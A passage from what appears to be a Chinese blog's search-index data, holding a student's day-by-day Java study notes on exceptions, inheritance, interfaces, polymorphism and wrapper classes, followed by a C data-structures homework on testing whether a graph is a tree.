这是因为Throwable包括了Err和Exception，使用Exception更能表示程序内部的错误，更加严谨 Throws用法 123public 类型 funcName(Params)throws Exception{} 如果有对象调用这个方法，就必须使用try，catch捕获，除非它也使了throws 如 12345678910111213141516171819class Math { public int div(int i, int j) throws Exception { int temp = i / j; return temp; }}public class main { public static void main(String args[]) { Math m = new Math(); // 下面必须捕获错误 try { System.out.println(m.div(10, 2)); } catch (Exception e) { e.prjavaintStackTrace(); } }} 或者 1234567public class main { public static void main(String args[])throws Exception{ Math m = new Math(); // 这里就不必捕获，错误交给了JVM System.out.println(m.div(10, 2)); }} Throw1234567public static void main(String args[])throws Exception{ try{ throw new Exception(\"my error\"); }catch(Exception e){ e.printStackTrace(); }} 自动抛出一个Exception，然后被捕获 一般情况下，throws和throw是配合使用的 如 12345678910111213class Math { public int div(int i, int j) throws Exception { int temp; try { temp = i / j; } catch (Exception e) {// 捕获异常 throw e;// 交给被调用处 处理 } finally { System.out.println(\"计算结束\"); } return temp; }} throws负责告诉上一级捕获错误，throw抛出错误 自定义错误12345class MyException extends Exception { public MyException(String msg) { super(msg); // 使用父亲的方法 }} 断言用法 12assert boolean表达式 ;assert boolean表达式 : 详细的信息 很明显，如果返回的结果为true，就不会提示任何错误信息；若结果为false，则按定义的错误进行返回，没有就使用默认的错误提示 如： 123456class Test{ public static void main(){ int []x ={1,2,3}; assert x.length==0:\"数组长不为0\"; }} 注意：1. 断言无法作为判断语句来使用 断言更多适用于测试环境，在开发中几乎不使用 总结 Java中使用try catch进行错误的捕获 finally一定执行，但是是在return之后（类似于golang的defer） throws表示该方法调用时需捕获错误，throw表示抛出错误 断言，JDK1.4之后的新功能，多用于测试环境。 异常的捕获，是因为在发生异常后，JVM会自动的产生一个错误实例，并去匹配响应的catch，查找错误。 异常的最大父级时Throwable，其拥有两个直系子类Exception（程序错误异常）和Error（JVM异常）","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"https://github.com/z-anshun/tags/JAVA/"}]},{"title":"JAVA学习第四天","slug":"day04","date":"2021-02-09T12:52:11.000Z","updated":"2021-02-09T12:52:40.058Z","comments":true,"path":"2021/02/09/day04/","link":"","permalink":"https://github.com/z-anshun/2021/02/09/day04/","excerpt":"","text":"适配器的设计为什么需要这个? 我们先假设一下，如果一个接口定义了许多抽象方法，那么即便我们需要实现这个接口，也不一定需要其中的全部方法，就会造成麻烦。 怎么解决？我们可以用一个抽象类来实现这个接口，里面的方法都为空，再用对应的对象来继承，覆盖。 如： 12345678910111213141516171819202122interface Window { void open();// 打开 void close();// 关闭 void activated();// 窗口活动 void iconified();// 窗口最小化 void deiconified();// 窗口恢复默认大小}// 声明一个抽象类做适配器abstract class WindowAdapter implements Window { public void open() {} public void close() {} public void activated() {} public void iconified() {} public void deiconified() {}}class WindowImpl extends WindowAdapter{ public void open(){ System.out.println(\"窗口打开\"); }} 如上，虽然Window接口规范了很多方法，但是充当适配器的类使WindowImpl只实现了对应的方法 类的内部扩展类里面也可声明接口 如： 1234567891011121314151617181920212223242526abstract class A { public abstract void printA(); interface B { void printB(); }}class X extends A { public void printA() { System.out.println(\"printA\"); } class Y implements B { public void printB() { System.out.println(\"printB\"); } }}public class main { public static void main(String args[]) { A.B b = new X().new Y(); b.printB(); }} 上面的调用很帅，只能匿名构造X再构造Y（new X().new Y()，当然，也可一步一步的来） 抽象类与接口的区别 区别点 抽象类（abstract） 接口（interface） 定义 至少包含一个抽象方法的类 由抽象方法和全局常量（public static final）组成 使用 extends implements 关系 抽象类可实现多个接口 接口不能继承抽象类，但允许继承多个接口 常见设计模式 模板设计 工厂设计，代理设计 局限 单类继承的局限 无 实际 一个模板 一个标准或表示一种能力 这里要注意的是，一个类尽量去避免继承一个已经实现好了的类。若抽象类与接口都可使用，则优先使用接口 Object类所以类的公共父类，即 class Person{}等同于class Person extends Object{} Object类也叫做普通类（跟js中的类似） Object的主要方法： public Object()：构造方法 public boolean equals(Object obj)：对象比较，默认的比较地址，若需比较值，则需覆盖 public int hashCode()：hash转码 public String toString()：用于打印对象的字符串化 对此，我们可以覆写Object的方法，比如，因为在打印时会自动调用toString打印地址，我们就可覆写，从而实现我们自己想要的打印方式 如: 1234567891011121314class Person { @Override public String toString() { System.out.println(super.toString());// Person@18769467 return \"Name+age\"; }}public class main { public static void main(String args[]) { Person p = new Person(); System.out.println(p);// Name+age }} 包装类将基本数据类作为对象处理，即进行包装，分别为：Integer、Character、Short、Long、Float、Double、Boolean、Byte 其中，Charater和Boolean属于Object的直接子类，而其它都是属于Number类的子类（Number类具有之间互相转换的方法） 拆箱与装箱如字面意思一样，拆箱即一个包装类变为基本数据类型，而装箱就是把一个基本数据类型变为包装类 如： 123int i=10;Integer integer=(Integer) i;// 装箱int temp=integer.intValue();// 拆箱 当然，自动装箱、拆箱也可 12Integer i = 10;// 自动装箱int temp = i;// 自动拆箱 匿名类1234567891011121314151617181920abstract class A extends Object { public abstract void printA(); interface B { void printB(); }}class T{ public void fun1(){ this.fun2(new A.B(){ public void printB() { System.out.println(\"匿名类\"); } }); } public void fun2(A.B b){ }} 跟匿名对象类似，直接内部实现接口，即匿名类（实现了对应的方法）。可以避免因为只使用一次接口而创建类的繁琐 总结： 适配器的设计，就是提高接口的灵活性 类的内部扩展，即接口与类的相互使用 普通类，即Object类，一切类的父类，实现了toString,equals和hashCode等方法 包装类，为了实现Java的一切皆对象的宗旨 匿名类，类似于匿名对象，再构造接口时，直接实现其方法","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"https://github.com/z-anshun/tags/JAVA/"}]},{"title":"JAVA学习第三天","slug":"day03","date":"2021-02-07T16:22:12.000Z","updated":"2021-02-07T16:22:58.148Z","comments":true,"path":"2021/02/08/day03/","link":"","permalink":"https://github.com/z-anshun/2021/02/08/day03/","excerpt":"","text":"面向对象（高级）继承语法： 123class 子类 extends 父类{ } 例： 12345class Student extends Person{ public Student(){ super(); // 调用父级的构造函数，当构造函数的参数为空时可省略 }} 换句话说，Student可以看作Person的扩充，也就是继承了Person的属性和方法，并且可添加属于自己的 并且，Java允许多类继承，但不能继承多类，即：一个儿子只能有一个父亲，而一个父亲可以有多个儿子。 注意：子类不能调用父类的私有成员和方法。并且，在构造子类时，会先构造其父类 覆盖当父级和子级有同一个名称的方法时，会优先调用子级的 1234567891011121314151617181920212223242526272829class Per { private String name; private int age; public Per(String s) { System.out.println(\"test\"); } void print() { System.out.println(\"This is print by Per\"); }}class Student extends Per { public Student() { super(\"\"); // 这里可以看作声明了一个父级对象(即可以调用父级的函数) } void print() { super().print(); // This is print by Per System.out.println(\"This is print by Student\"); }}public class main{ public static void main(String args[]){ Student s=new Student; s.print();// This is print by Student }} 这里要提示一点，对于同名的方法，子级的权限需要大于等于父级 如，下面就错误的写法 1234567891011121314// 权限: private&lt;default&lt;publicclass Per { ... public void print() { System.out.println(\"This is print by Per\"); }}class Student extends Per { ... void print() { System.out.println(\"This is print by Student\"); }} 注意，方法的复写，一定是同等级的，如下： 1234567891011121314151617181920212223242526272829303132333435class Per { private String name; private int age; private void print() { System.out.println(\"This is print by Per\"); } public void fun(){ this.print();// This is print by Per this.print1();// This is print1 by Student } void print1(){ System.out.println(\"This is print1 by Per\"); }}class Student extends Per { public Student() { super(); } void print() { System.out.println(\"This is print by Student\"); } void print1(){ System.out.println(\"This is print1 by Student\"); }}class public main{ public static void main(){ Student s=new Student(); s.fun(); }} 分析：因为Per的print权限低于Student所以并没有被覆盖，在当前就寻找Per的方法(可以看作js的属性链,即就近选择原则) super和this的区别 区别点 this super 属性访问 访问本类中的属性，如果没有，就从父类中继续寻找 访问父类的属性 方法 访问本类的方法，如果没有，就从父类中去寻找 直接访问父类的方法 调用构造 调用本类的构造，必须放在首行 调用父类的构造，必须放在子类首行 特殊 表示当前对象 无此概念 final可用于声明类，属性和方法 有下面几点需要注意： final声明的类不能拥有子类 声明的方法不能被子类覆写 声明的变量即常量。即对变量用final声明时，等价于const 如下，B类复写了A的使用final声明的方法 1234567891011class A{ final void print(){ }}class B extends A{ void print(){ }} 抽象类抽象类，就类似于模板的作用。我们使用abstract来声明该类或方法为抽象类 使用规则如下： 包含一个抽象方法的类必须是抽象类 需用abstract来进行声明 抽象方法只需声明，而不必被实现 抽象类必须被继承，并且，若子类不是抽象类的话，需将抽象类的抽象方法全部覆盖 使用规范： 123456789abstract class 抽象类名{ 属性; // 普通方法 访问权限 返回类型 方法名(参数){ } // 抽象方法 访问权限 abstract 返回类型 方法名(参数); // 这里不需要实现} 例子： 12345678910111213abstract class A { public static final String name = \"as\"; public abstract void print();}class B extends A { // 这里的权限要跟上面一样 public void print() { System.out.println(this.name); }} 注意，因为抽象化的方法是允许子类覆写的，所以一个抽象类不能使用final和private声明抽象方法的 实际上抽象类，也只是比普通类多了一个抽象类的方法，其它就没有什么特别的了 接口一种特殊的类，由全局常量和公共的抽象方法组合而成 格式： 12345678910interface 接口名{ 全局常量; 抽象方法;// 这里的抽象方法必须是public权限才行。并且，即使你不写这里也默认就是public}//调用class 类名 implements 接口名1,接口名2...{ 实现对应的方法} 如： 123456789101112interface C { // 下面的声明都是简写 String name = \"as\";// public static final String name=\"as\"; void print();// public abstract void print();}class D implements C { public void print() { System.out.println(this.name); }} 注意：接口可以被实施多个，并且抽象类与接口之间可以相互继承（因为接口也是一种类） 多态性Java在面向对象时，其多态性主要有下面两种方式体现： 方法的重载和重写（覆盖） 对象的多态性 而对象的多态性主要是：向上转型（父类继承子类）和向下转型（子类继承父类） 如;向上转型（子类 -&gt; 父类）: 1234567891011121314151617181920212223242526272829class E{ public void fun1(){ System.out.println(\"E的fun1\"); } public void fun2(){ this.fun1(); }}class F extends E{ @Override public void fun1() { System.out.println(\"F的fun1\"); } public void fun3(){ System.out.println(\"This is fun3\"); }}public class main { public static void main(String args[]) { F f = new F(); E e=new E(); e.fun2();// E的fun1 e=f; e.fun2();// F的fun1 e.fun1();// F的fun1 }} 这里是因为父类的方法被子类覆盖，然后父类对象指向了子类对象，即对应的父类被子类覆盖了，完成了向上转型 注意：F f=(F)e或F f = new F();f=e;这样的强制转型是不行的，即父类强制转换为子类，因为子类永远的方法，父类不一定拥有(即父亲可以代替儿子，儿子不能代替父亲) 错误例子： 1234567public class main { public static void main(String args[]) { E e=new E(); F f = (F)e; f.fun1(); }} 那么怎么解决呢？使用方法的重载 如： 123456public static void fun(E e){ e.fun1();}public static void fun(F f){ f.fun1();} instanceofinstanceof，如字面意思一样，判断这个对象是那个类的实例 使用例子： 1234567891011121314public class main { public static void main(String args[]) { E e1 = new F(); boolean b1 = e1 instanceof E; boolean b2 = e1 instanceof F; System.out.println(b1);// true System.out.println(b2);// true E e2 = new E(); boolean b3 = e2 instanceof E; boolean b4 = e2 instanceof F; System.out.println(b3);// true System.out.println(b4);// false }} 解析：父类可以变成子类，即可以向上或向下转型，但如果直接使用了父类实例化就不能再转换了 使用地方，父类做参数，判断属于哪个子类（即使，若A有B、C两个子类，就可判断） 补充: 1234F f1=new F();E e = f1;F f=(F)e;f.fun1(); 这样是允许的，所以可以将子类做参数再传递（其实链式理解也能相当，因为构造函数是从最高级开始，若前面没构造，理所当然不能强制转换） 注意：子类因为实现父类的，所以子类可以赋值给父类（这里的父类包括接口，抽象类等） 总结 继承，覆盖等都是子级对父级的 super是在子级里调用父级，跟this差不多，都会指向一个构造函数 final如果对变量声明就等同于const，对方法和类，都会使其不具有继承效果 抽象类（abstract）相当于子级必须实现的方法 接口（interface），类似于golang的接口，相当于一个模板 多态，子级能赋值给父级，而父级不能赋值给子级（因为父级并没有实现子级的模板，如果实现了，一样可以，即该父级也是由子级得来的） instanceof，用来判断是属于哪个类，对于工厂模式有用","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"https://github.com/z-anshun/tags/JAVA/"}]},{"title":"JAVA学习第二天","slug":"day02","date":"2021-02-05T15:31:47.000Z","updated":"2021-02-05T15:38:15.211Z","comments":true,"path":"2021/02/05/day02/","link":"","permalink":"https://github.com/z-anshun/2021/02/05/day02/","excerpt":"","text":"面向对象面向对象具有的特征 封装性：即将其对象封装起来，并且实现“信息隐蔽”。也就是说只需要外界知道怎么使用，也不需要了解其细节，个别属性外界无法知道 继承性：顾名思义，儿子继承父级的一些方法。目的是为了增加代码的复用性，提高软件开发的效率。普通的继承只能是单类，若需要多类继承，则可以使用接口（interface）来实现多类继承 多态性：即允许程序中出现重名的现象，Java中含有方法重载和对象多态（子类对象和父类对象可以相互转换，而且可根据其使用不同的子类，完成不同的功能）两种。 类与对象类是一种基本特征抽象，对象就是一个个具体的东西。 即：类定义了一个模板（类似于接口，但接口没有继承性，多态性等），对象就是满足对应类的东西 类的定义1234567class 类名{ 数据类型 属性; ... public 返回的类型 funName(params){ } } 补充： 这里为什么没有static？ static声明，表示该方法由类调用，而不声明，就表示由对象调用 1234567891011121314151617181920212223public class main { public static void main(String args[]){ Person p=new Person(); p.name=\"as\"; p.age=20; // 这个对象只能调用没有static的方法 p.tell(); // 下面由类调用 Person.test(); }}class Person{ String name;// 如果这个前面加了static就可以认为这个name为这个类公用的一个变量 int age; public void tell(){ System.out.println(\"name=\"+name+\"\\tage=\"+age); System.out.println(this.getClass().getTypeName()); } public static void test(){ System.out.println(\"这里没有对象\"); }} 访问的属性private和public private为私有，而public为公有 即： 12345678class Person{ static String name;// 全局 int age;// 默认就是public，即对应的对象也能访问 private String proving;// 这个属性只能类内部能访问 public void tell(){ } } 那么，封装了的属性，即private声明的属性，外部能不能访问呢？ 答案肯定是可以的，我们可以调用使用setter和getter来调用 1234567public String getProving() { return proving;}public void setProving(String proving) { this.proving = proving;} 如果我们现在用一张图来表示Person Person +name:String +age:int -proving:String +getProving():void +setProving(String proving):void +tell():void 即：+属性名称:类型（-为private封装了的） 自定义构造方法规范 12345访问权限 类名(参数){ // 方法名必须跟类名一致 // 不能有返回的类型 // 不能有return返回} 例： 1234567891011121314class Person { static String name; int age; private String proving; public Person(){ System.out.println(\"构造了一个新对象\"); }}public class main{ public static void main(String args[]){ Person p=new Person() // 构造了一个对象 }} 其实即使自己不添加构造方法，在编译的过程中，也是会自行添加一个默认的构造方法的 如： 123456class Person(){ // 默认在编译的时候添加 public Person(){ }} 类图画表示构造函数 +&lt;&lt;Constructor&gt;&gt;Person() 总之，一个类，至少会有一个构造函数，如果没有自己添加，就会在编译时，系统默认添加。另外，即使是构造函数，其方法也是允许重载的 String在Java中，String不需要基础结构，而属于一个类 那么，我们来看如下的一段代码 123456789public class main { public static void main(String args[]) { String str1=\"as\";// 将已经开辟好的堆给str1，并放入String的内存池 String str2=new String(\"as\"); String str3=\"as\";// 因为重复，直接使用上面已经开好的堆 System.out.println(str1==str2);// false System.out.println(str1==str3);// true }} 很明显，直接String赋值，跟调用构造函数赋值是不一样的 这是因为str1和str2申请的不是同一个堆，即str2新开了一个空间，而直接赋值，相当于一个匿名对象 并且，对于String类的比较，“==”是比较其地址的值，并此String提供了一个专门比较String的方法 public boolean equals(String str) 尽力避免字符串的修改我们先看一段代码 1234567public class main { public static void main(String args[]) { String str=\"hello\"; str=str+\" world\"; System.out.println(str); }} 这里的字符串是能够修改的，但是，在这里，我们先申请了“hello”的堆，后面又申请了“ world”的堆，最后生成了“hello world”的堆。所以这里造成了内存浪费，在很多语言里，也是避免直接拼接字符串的，而尽量用buffer来 String的重载 public String(char[] value) public String(char[] value,int offset,int count) public String(byte[] bytes) public String(byte[] bytes,int offset,int length) 另外String还含有其它很多方法，更多可参考JDK文档 引用类java中的类为我们平时说的指针类型，也就是引用类 12345678910111213public class main { public static void main(String args[]) { Person p=new Person(); p.age=20; System.out.println(p.age);// 20 fun(p); System.out.println(p.age);// 21 } // 这里得用static，因为是直接由主方法调用，而不是对象 public static void fun(Person p){ p.age=21; }} 下面，我再看一段代码 123456789101112public class main { public static void main(String args[]) { String str1=\"as\"; System.out.println(str1);// as fun1(str1); System.out.println(str1);// as } public static void fun1(String s){ s=\"as12\"; }} 明明前面已经讲过，String是类，即str1为指针，那么这里为什么没有改变。 我们再想一下，再Java里，一个字符串，即一个String得匿名对象，换句话说，每个不同的字符串，都在不同的堆地址，那么，s=\"as12\";这里也只是改变了s指向的地址。（因为一开始 s 跟 str1 ，形参只是复制了形参的值罢了，所以并没有改变 str1 指向的位置） this关键字this 表示当前环境的对象（如果学过js的，就了解了） 这里指的是对象，不是类，也就是如果在当前方法里调用使用this调用static声明的方法，是不行的 补充：this()表示调用当前的构造函数(有参数就对应有参数的方法)，即:this() -&gt; this=new Person()。（只能在构造函数中使用，因为构造函数就是return this） static声明static声明的属性叫全局属性，也叫静态属性。 如果static声明的为类的属性，就是这个类的对象通用的属性（即一改均改）。 如果static声明的为类的方法，就是这个类通用的方法，并且本类的其它方法可直接调用 代码块123456789101112131415161718class Demo{ { System.out.println(\"1.构造块\"); } static { System.out.println(\"0.静态代码块\"); } public Demo(){ System.out.println(\"2.构造方法\"); }}public class main{ public static void main(String args[]){ new Demo(); new Demo(); }} 输出： 123450.静态代码块1.构造块2.构造方法1.构造块2.构造方法 从上我们看出，静态代码块最先执行，然后是构造块，最后才是构造方法（即使交换代码位置也一样） 并且，静态代码块只会执行一次（这点相当于init函数） 单态设计12345678910111213141516171819202122232425class Singleton { private static Singleton instance = new Singleton(); // 私有的构造函数 private Singleton() { } public static Singleton getInstance() { return instance; } public void print() { System.out.println(\"test\"); }}public class main { public static void main(String args[]) { Singleton s1 = Singleton.getInstance(); Singleton s2 = Singleton.getInstance(); Singleton s3 = Singleton.getInstance(); s1.print(); s2.print(); }} 这里的s1,s2,s3都是指向的同一个对象，还完成了很好的封装。只能由getInstance来构造对象（可以设计回收站等） 总结 对象：具有多态、继承和封装的性质 类（class）：每个类至少有一个构造函数，没有就使用默认的 private：代表私有属性，只能类的内部访问，提高了封装性 public：均可访问 static：全局属性（即类可调用），public static main(String args[])肯定必须是静态的方法才能给类调用 代码块：静态块只执行一次，然后是构造块，最后才是构造函数 单态设计：良好的封装，外部不能直接使用new进行构造","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"https://github.com/z-anshun/tags/JAVA/"}]},{"title":"JAVA学习第一天","slug":"day01","date":"2021-02-04T14:28:28.000Z","updated":"2021-02-04T14:32:48.326Z","comments":true,"path":"2021/02/04/day01/","link":"","permalink":"https://github.com/z-anshun/2021/02/04/day01/","excerpt":"","text":"梦开始的地方12345public class main { public static void main(String[] args){ System.out.println(\"hello world\"); }} 前言Java的简介java具有三个发展方向，分别是 JAVA SE: JAVA的核心语言类，也是我要学的，主要是数据库的连接，接口的定义，输入/输出和网络编程 JAVA ME: 主要用于软件的开发 JAVA EE: 包含java se的类，还包含企业级应用的类 为什么要学java？ 简洁：前身是基于C++开发的OAK，从而省略了C++中个别繁琐的特性（当然，个人认为，golang还是更简洁一点） 可移植性：能够在多个平台上运行 面向对象： 适合分布式运算：这是最近比较热门的东西，因为java具有强大的联网能力，可以远程访问文件就像url一样访问远程对象一样 性能好 健壮、防患于未然：由于java具有伪编译这一层（即先将其转化为字节码，再解释），从而再伪编译时，就会将正常运行时的错误找出来 多线程 安全 动态语言：跟py一样 Java的运行机制计算机高级语言主要有编译性和解释性两种类型，而Java就是这两种类型的集合， 假设，我们写了一个main.java的文件，它会首先将它编译成main.class，然后再解释为字节。（这里要注意的是，执行这个class文件的是在JVM（Java Virtual Machine）上执行的，也就是一虚拟机，而java解释器就负着这个虚拟机的运行，所以跟计算机无关，提高了可移植性） 补充：这里的JVM会自己识别操作系统，从而进行不同的处理，换句话说，这里的JVM充当了一个翻译官的身份。 环境配置jetbrain 一键配置 Hello world!123456// 跟其它语言一样，main为入口public class main{ public static void main(String []args){ System.out.println(\"Hello world!\"); // Hello world! }} 补充：这里的String[] args、String []args和String args[]都是一样的 classpath在前面，我们已经提到过，每次的程序启动，都会创建一个JVM，而calsspsth，顾名思义，就是去寻找class的路径。我们可以通过set callspth=xxx来设置，默认就是当前目录 变量的声明由于java的是根据C++的，而C++又是根据C的，所以这里的变量声明是类似于C的 基本数据类型12345678910111213141516171819public class TestInt{ // 这里的main为主方法，class main就是主类 public static void main(String []args){ int num=10; // 这里不像go那样 var int num=10 long l = 10; short s=1; boolean t=true; float f= 1.022F; // 如果是小数，后面就得跟F。因为默认的小数的double，所以不加的话，在编译时就会出错 double d=2.22; // 这里得D可有可无 byte b='a'; char c='a'; char []ch={'a','s'}; System.out.println(num);// 10 System.out.printf(\"float=%f\\n\",f);//1.022000 System.out.printf(\"byte=%c\\nchar=%c\\n\",b,c);// a a System.out.println(ch);// as }} 注意，因为java里面都是类，所以这里的TestInt就是主类的名字，并且，这个类还必须和文件名一样 还有，对于public class和class的区别就是，public class必须跟文件名一样，而class不用 123456// 这里注意命名规范，类开头都要大写class Test{ public static void test(String args[]){ System.out.println(\"This is a test\"); }} 再补充一点，所以的数据初始默认为对应类型的0；~sum为输出sum的反码 注释 单行：// 多行：/* */ 文档：/** */ 扩大转换对于java是强类型语言，你不能直接去改变一个类型，只能调用相应的函数或方法，即显示的转换它。因此，java里的类型转换是安全的，比如short专int，只能往占用内存大的转换，并且在表达式中，如果byte这些，都默认为int 如： 1234567public class main{ public class void main(String []args){ float f=1.0F; int i=(int)f; System.out.Println(i);// 1 }} 运算符基础，自行解决 选择和循环基础就不提了 注意的是switch跟c一样，每次判断后需要break，如： 12345678910111213public static void sw() { int i = 10; switch (i/2) { case 1: break; case 2: break; case 3: break; default: System.out.println(\"default\"); }} if if else while do while for(初值;判断条件;操作) 如： 12345678910class ForNestedDemo{ public static void main(){ for(int i=1;i&lt;=9;i++){ for(int j=1;j&lt;=i;j++){ System.out.print(i+\"*\"+j+\"=\"+i*j+\"\\t\"); } System.out.println(); } }} 数组12345678class Arr{ public static void main(){ int arr[]=null; arr=new int[10]; arr[0]=1; System.out.println(arr.toString()); }} 这里，因为数组为引用类型，所以初始定义为null，后面再用new构造 虽然，再JDK1.5后，不必对数组地址进行初始化，但为了规范，最好还行进行初始化 补充：引用类的地址属于栈分配，而数据属于堆分配。即上面的arr为栈分配的，arr[3]为堆分配的 二维跟一维类似，这里就不提了 12345678class Arr{ public static void main(){ int arr[][][]=null; arr=new int[1][1][1]; arr[0][0][0]=12; System.out.println(arr[0][0][0]); }} 但是，这里的构造new直接就可构造几维的，不需要像golang，c那样层层的构造 方法声明1234public static 返回类型 方法名(参数){ 语句; return xxx; // 只有在返回类型为void时，可以省略} 如果只主类的主方法，就是一定要带上public，其它的，可带可不带 命名规范跟类不同，类是每个单词的首字母大写，而方法是第一个单词的首字母小写，其它大写（如：addOne,addTwo） 方法的重载首先，我们思考一个问题，System.out.println()为什么能打印整形，字符串，布尔等类型呢？ 我们再来看一段代码 123456789101112131415public class main { public static void main(String args[]) { add(1,2); add(1,2,3); } static int add(int x,int y){ return x+y; } static int add(int x,int y,int z){ return x+y+z; } static float add(float x,float y){ return x+y; }} 很明显，这个程序是没有错误的，换句话说，在JAVA里面，即使方法名相同，参数不同，都会被当成不同的函数。 因此，System.out.println()会自动寻找其对于的方法 注意：重载只在参数上，不在返回类型上，即： static int add(int x,int y)和static float add(int x,int y)会被认为是同一个方法 可变参数public static fun(int... arg) 跟go类似，便不再多提 foreach类型于for range 如： 12345public static void fun(int... arg) { for (int x : arg) { System.out.println(x); }} 总结： JAVA的优点 JVM提供的可移植性 类 class，主类public class（主类必须和文件名一致） 方法 static int fun(params)，主方法public int main(String args[]) 命名规范 类的首字母大写，方法就第一个单词首字母小写 方法的重载，类似于golang的接口（都是找到对应方法），但重载只在于参数 foreach类似于go的for rang，python的for in","categories":[{"name":"学习","slug":"学习","permalink":"https://github.com/z-anshun/categories/%E5%AD%A6%E4%B9%A0/"}],"tags":[{"name":"JAVA","slug":"JAVA","permalink":"https://github.com/z-anshun/tags/JAVA/"}]},{"title":"数据结构作业","slug":"work","date":"2020-11-30T13:57:35.000Z","updated":"2020-11-30T13:56:44.128Z","comments":true,"path":"2020/11/30/work/","link":"","permalink":"https://github.com/z-anshun/2020/11/30/work/","excerpt":"","text":"数据结构作业T1邻接矩阵的做法首先，先声明邻接矩阵的结构体 12345678910111213141516171819202122232425262728293031int Visited[MAX_VERTEX_NUM]; /*访问标志数组(全局量) 用于访问标记*/// 图的数据结构：邻接多重表typedef enum{ unvisited, visited} VisitIf;// 邻接多重表的边typedef struct EBox{ VisitIf mark; // 访问标记 int ivex, jvex; // 两个顶点位置 struct EBox *ilink, *jlink; // 两个顶点的下一条边 char *info; // 和边的有关信息} EBox;// 表头结点typedef struct VexBox{ char data; // 对应数据 EBox *firstedge; // 指向第一条依附该顶点的边} VexBox;// 邻接多重表typedef struct{ VexBox adjmulist[MAX_VERTEX_NUM];c int vexnum, edgenum; // 顶点数和边数} AMLGraph; 然后声明三个函数（这里可不用出现在作业里，而且我也在网上copy的，只是为了方便理解），分别是： LocateVex: 根据值，找到对应的顶点 FirstAdjvex: 找到该结点的第一个邻接顶点 NextAdjvex: 找到该结点的下一个邻接顶点 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263int LocateVex(AMLGraph *G, char u) //在邻接多重表定位u顶点{ int i; for (i = 0; i &lt; G-&gt;vexnum; i++) if (u == G-&gt;adjmulist[i].data) return i; return -1;}//返回v的顶点值int FirstAdjvex(AMLGraph *G, char v) //寻找v点的第一邻接点{ int i; i = LocateVex(G, v); //定位V顶点 if (i &lt; 0) return -1; else if (G-&gt;adjmulist[i].firstedge != NULL) //说明该顶点存在邻接点 { if (G-&gt;adjmulist[i].firstedge-&gt;ivex == i) //如果该顶点所接边的ivex是i的话 { return G-&gt;adjmulist[i].firstedge-&gt;jvex; //该顶点的邻接点是jvex } else return G-&gt;adjmulist[i].firstedge-&gt;ivex; //否则该顶点的邻接点是ivex } else return -1;}int NextAdjvex(AMLGraph *G, char v, char w) //寻找v顶点的邻接点w的下一邻接点{ int i, j; EBox *p; i = LocateVex(G, v); //分别寻找i顶点和j顶点 j = LocateVex(G, w); if (i &lt; 0 || j &lt; 0) return -1; p = G-&gt;adjmulist[i].firstedge; //p指向顶点v的第一条边 while (p != NULL) if (p-&gt;ivex == i &amp;&amp; p-&gt;jvex != j) //不是邻接顶点(情况1) p = p-&gt;ilink; //找下一邻接顶点 else if (p-&gt;jvex == i &amp;&amp; p-&gt;ivex != j) //不是邻接顶点(情况2) p = p-&gt;jlink; //找下一邻接顶点 else break; //否则是邻接顶点 if (p &amp;&amp; p-&gt;ivex == i &amp;&amp; p-&gt;jvex == j) //找到邻接顶点w (情况1) { p = p-&gt;ilink; if (p &amp;&amp; p-&gt;ivex == i) return p-&gt;jvex; else if (p &amp;&amp; p-&gt;jvex == i) return p-&gt;ivex; } if (p &amp;&amp; p-&gt;ivex == j &amp;&amp; p-&gt;jvex == i) //找到邻接顶点w (情况2) { p = p-&gt;jlink; if (p &amp;&amp; p-&gt;ivex == i) return p-&gt;jvex; else if (p &amp;&amp; p-&gt;jvex == i) return p-&gt;ivex; } return -1;} 最后，实现要求（总的来说就是遍历问题） 1234567891011121314151617181920212223242526272829303132333435363738// 要求：判断一个无向图G是否为一颗树// 思路：图连通图，为n为顶点数，边数为（2*n-1)的图为树// 时间复杂度: O(n)int JudgeIsTree(AMLGraph *G){ int vNum, eNum = 0; // 遍历的结点数和边数 // 这里采用深度优先搜索 DFS(G, 0, vNum, eNum); if (vNum == G-&gt;vexnum &amp;&amp; eNum == 2 * (G-&gt;vexnum - 1)) return 1; else return 0;}void DFS(AMLGraph *G, int v, int *vNum, int *eNum) //从顶点v开始深度优先遍历{ char u; // 该结点的data int w; Visited[v] = 1; //遍历后v点标志域改为1 (*vNum)++; // 结点数+1 u = G-&gt;adjmulist[v].data; // 遍历该结点的边 // FirstAdjve -&gt; 返回u的第一个邻接点 NextAdjvex -&gt; 返回w的下一个邻接点 for (w = FirstAdjvex(G, u); w &gt;= 0; w = NextAdjvex(G, u, G-&gt;adjmulist[w].data)) { (*eNum)++; // 边数 +1 // 如果还没有访问的结点,则继续访问 if (Visited[w] == 0) { DFS(G, w, vNum, eNum); } }} 邻接矩阵实现1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162#include &lt;stdio.h&gt;#define MaxSize 50 /*最大顶点个数*/typedef enum{ DG, DN, UG, UN} GraphKind; /*图的类型：有向图、有向网、无向图和无向网*/typedef struct ArcNode /*边表结点的类型定义*/{ int adjvex; /*弧指向的顶点的位置*/ char *info; /*与弧相关的信息*/ struct ArcNode *nextarc; /*指示下一个与该顶点相邻接的顶点*/} ArcNode;typedef struct VNode /*表头结点的类型定义*/{ char data; /*用于存储顶点*/ ArcNode *firstarc; /*指示第一个与该顶点邻接的顶点*/} VNode, AdjList[MaxSize];typedef struct /*图的类型定义*/{ AdjList vertex; int vexnum, arcnum; /*图的顶点数目与弧的数目*/ GraphKind kind; /*图的类型*/} AdjGraph;int visited[MaxSize];// 时间复杂度：O(n)int JudgeIsTree(AdjGraph *G){ int vNum, eNum = 0; // 遍历的结点数和边数 // 这里采用深度优先搜索 DFS(G, 0, vNum, eNum); if (vNum == G-&gt;vexnum &amp;&amp; eNum == 2 * (G-&gt;vexnum - 1)) return 1; else return 0;}// 深度优先搜索遍历结点void DFS(AdjGraph *G, int v, int *vNum, int *eNum){ ArcNode *p; visited[v] = 1; // 标记已遍历 